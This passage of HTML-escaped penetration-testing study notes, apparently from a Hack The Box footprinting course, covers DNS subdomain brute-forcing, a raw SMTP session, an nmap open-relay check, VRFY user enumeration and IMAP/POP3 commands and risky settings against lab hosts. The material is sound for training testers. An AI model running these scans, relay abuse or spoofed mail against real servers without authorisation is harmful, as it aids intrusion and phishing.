unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.

Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers


Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
_______________________________________________________________________________________________________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

...SNIP...
done.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;also ffuf -with -H ‘Host: FUZZ.example.com’ is good&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 dnsenum &lt;span class=&quot;nt&quot;&gt;--dnsserver&lt;/span&gt; 10.129.11.211 &lt;span class=&quot;nt&quot;&gt;--enum&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; subs  -f /opt/SecLists/Discovery/DN  
S/fierce-hostlist.txt dev.inlanefreight.htb    
dnsenum VERSION:1.3.1  
  
&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;   dev.inlanefreight.htb   -----  
  
  
Host&lt;span class=&quot;s1&quot;&gt;&apos;s addresses:  
__________________  
  
  
  
Name Servers:  
______________  
  
ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1  
  
  
Mail (MX) Servers:  
___________________  
  
  
  
Trying Zone Transfers and getting Bind Versions:  
_________________________________________________  
  
unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.  
  
Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ...    
AXFR record query failed: no nameservers  
  
  
Brute forcing with /home/nullbyte/SecLists/Discovery/DNS/fierce-hostlist.txt:  
______________________________________________________________________________  
  
dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6  
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1  
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203  
  
  
Launching Whois Queries:  
_________________________  
  
  
  
dev.inlanefreight.htb_____________________  
  
  
  
Performing reverse lookup on 0 ip addresses:  
_____________________________________________  
  
  
0 results out of 0 IP addresses.  
  
  
dev.inlanefreight.htb ip blocks:  
_________________________________  
  
  
done.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;smtp&quot;&gt;SMTP&lt;/h1&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Simple Mail Transfer Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMTP&lt;/code&gt;) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.&lt;/p&gt;

&lt;p&gt;By default, SMTP servers accept connection requests on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;25&lt;/code&gt;. However, newer SMTP servers also use other ports such as TCP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;587&lt;/code&gt;. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network.&lt;/p&gt;

&lt;p&gt;SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;25&lt;/code&gt; for the encrypted connection, for example, TCP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;465&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mail User Agent&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MUA&lt;/code&gt;), converts it into a header and a body and uploads both to the SMTP server. This has a so-called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mail Transfer Agent&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MTA&lt;/code&gt;), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mail Submission Agent&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSA&lt;/code&gt;), which checks the validity, i.e., the origin of the e-mail. This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSA&lt;/code&gt; is also called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Relay&lt;/code&gt; server. These are very important later on, as the so-called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Open Relay Attack&lt;/code&gt; can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.&lt;/p&gt;

&lt;p&gt;|Client (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MUA&lt;/code&gt;)|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;➞&lt;/code&gt;|Submission Agent (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSA&lt;/code&gt;)|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;➞&lt;/code&gt;|Open Relay (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MTA&lt;/code&gt;)|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;➞&lt;/code&gt;|Mail Delivery Agent (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MDA&lt;/code&gt;)|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;➞&lt;/code&gt;|Mailbox (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POP3&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAP&lt;/code&gt;)|
|—|—|—|—|—|—|—|—|—|&lt;/p&gt;

&lt;p&gt;Suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol &lt;a href=&quot;http://dkim.org/&quot;&gt;DomainKeys&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DKIM&lt;/code&gt;), the &lt;a href=&quot;https://dmarcian.com/what-is-spf/&quot;&gt;Sender Policy Framework&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SPF&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AUTH PLAIN&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;AUTH is a service extension used to authenticate the client.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELO&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client logs in with its computer name and thus starts the session.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAIL FROM&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client names the email sender.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCPT TO&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client names the email recipient.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DATA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client initiates the transmission of the email.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSET&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client aborts the initiated transmission but keeps the connection between client and server.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VRFY&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client checks if a mailbox is available for message transfer.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EXPN&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client also checks if a mailbox is available for messaging with this command.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NOOP&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client requests a response from the server to prevent disconnection due to time-out.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;QUIT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The client terminates the session.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;To interact with the SMTP server, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELO&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EHLO&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is &lt;span class=&quot;s1&quot;&gt;&apos;^]&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: &amp;lt;cry0l1t3@inlanefreight.htb&amp;gt;

250 2.1.0 Ok


RCPT TO: &amp;lt;mrb3n@inlanefreight.htb&amp;gt; &lt;span class=&quot;nv&quot;&gt;NOTIFY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;success,failure

250 2.1.5 Ok


DATA

354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;

From: &amp;lt;cry0l1t3@inlanefreight.htb&amp;gt;
To: &amp;lt;mrb3n@inlanefreight.htb&amp;gt;
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don&lt;span class=&quot;s1&quot;&gt;&apos;t work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;dangerous-settings-2&quot;&gt;Dangerous Settings&lt;/h2&gt;

&lt;p&gt;To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.&lt;/p&gt;

&lt;p&gt;Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.&lt;/p&gt;

&lt;h4 id=&quot;open-relay-configuration&quot;&gt;Open Relay Configuration&lt;/h4&gt;

&lt;p&gt;SMTP&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mynetworks = 0.0.0.0/0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap 10.129.14.128 &lt;span class=&quot;nt&quot;&gt;-p25&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; smtp-open-relay &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;


PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16/16 tests&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|  MAIL FROM:&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; -&amp;gt; RCPT TO:&amp;lt;relaytest@nmap.scanme.org&amp;gt;
|  MAIL FROM:&amp;lt;antispam@nmap.scanme.org&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest@nmap.scanme.org&amp;gt;
|  MAIL FROM:&amp;lt;antispam@ESMTP&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest@nmap.scanme.org&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest@nmap.scanme.org&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest%nmap.scanme.org@[10.129.14.128]&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest%nmap.scanme.org@ESMTP&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;relaytest@nmap.scanme.org&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;relaytest%nmap.scanme.org&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest@nmap.scanme.org@[10.129.14.128]&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;relaytest@nmap.scanme.org&quot;&lt;/span&gt;@[10.129.14.128]&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;relaytest@nmap.scanme.org@ESMTP&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;@[10.129.14.128]:relaytest@nmap.scanme.org&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;@ESMTP:relaytest@nmap.scanme.org&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;nmap.scanme.org!relaytest&amp;gt;
|  MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;nmap.scanme.org!relaytest@[10.129.14.128]&amp;gt;
|_ MAIL FROM:&amp;lt;antispam@[10.129.14.128]&amp;gt; -&amp;gt; RCPT TO:&amp;lt;nmap.scanme.org!relaytest@ESMTP&amp;gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;SMTP ENUM&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smtp-user-enum &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; VRFY &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; /home/nullbyte/SecLists/smtp/footprinting-wordlist.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10.129.19.6 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 15 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;    
Starting smtp-user-enum v1.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://pentestmonkey.net/tools/smtp-user-enum &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
  
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------&lt;/span&gt;  
|                   Scan Information                       |  
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------&lt;/span&gt;  
  
Mode ..................... VRFY  
Worker Processes ......... 5  
Usernames file ........... /home/nullbyte/SecLists/smtp/footprinting-wordlist.txt  
Target count ............. 1  
Username count ........... 101  
Target TCP port .......... 25  
Query &lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt; ............ 15 secs  
Target domain ............
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;imap--pop3&quot;&gt;IMAP / POP3&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;With the help of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Internet Message Access Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAP&lt;/code&gt;), access to emails from a mail server is possible. Unlike the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Post Office Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POP3&lt;/code&gt;), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.&lt;/p&gt;

&lt;p&gt;The client establishes the connection to the server via port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;143&lt;/code&gt;. For communication, it uses text-based commands in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASCII&lt;/code&gt; format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.&lt;/p&gt;

&lt;p&gt;SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;143&lt;/code&gt; or an alternative port such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;993&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;imap-commands&quot;&gt;IMAP Commands&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 LOGIN username password&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;User’s login.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 LIST &quot;&quot; *&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Lists all directories.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 CREATE &quot;INBOX&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Creates a mailbox with a specified name.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 DELETE &quot;INBOX&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Deletes a mailbox.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 RENAME &quot;ToRead&quot; &quot;Important&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Renames a mailbox.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 LSUB &quot;&quot; *&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Returns a subset of names from the set of names that the User has declared as being &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subscribed&lt;/code&gt;.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 SELECT INBOX&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Selects a mailbox so that messages in the mailbox can be accessed.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNSELECT INBOX&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Exits the selected mailbox.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 FETCH &amp;lt;ID&amp;gt; all&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Retrieves data associated with a message in the mailbox.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 CLOSE&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Removes all messages with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Deleted&lt;/code&gt; flag set.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 LOGOUT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Closes the connection with the IMAP server.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;pop3-commands&quot;&gt;POP3 Commands&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;USER username&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identifies the user.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PASS password&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Authentication of the user using its password.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STAT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Requests the number of saved emails from the server.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LIST&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Requests from the server the number and size of all emails.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETR id&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Requests the server to deliver the requested email by ID.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DELE id&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Requests the server to delete the requested email by ID.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAPA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Requests the server to display the server capabilities.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSET&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Requests the server to reset the transmitted information.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;QUIT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Closes the connection with the POP3 server.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;dangerous-settings-3&quot;&gt;Dangerous Settings&lt;/h2&gt;

&lt;p&gt;Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Setting&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_debug&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Enables all authentication debug logging.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_debug_passwords&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_verbose&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Logs unsuccessful authentication attempts and their reasons.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_verbose_passwords&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Passwords used for authentication are logged and can also be truncated.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_anonymous_username&lt;/code&gt;&lt;/td&gt;
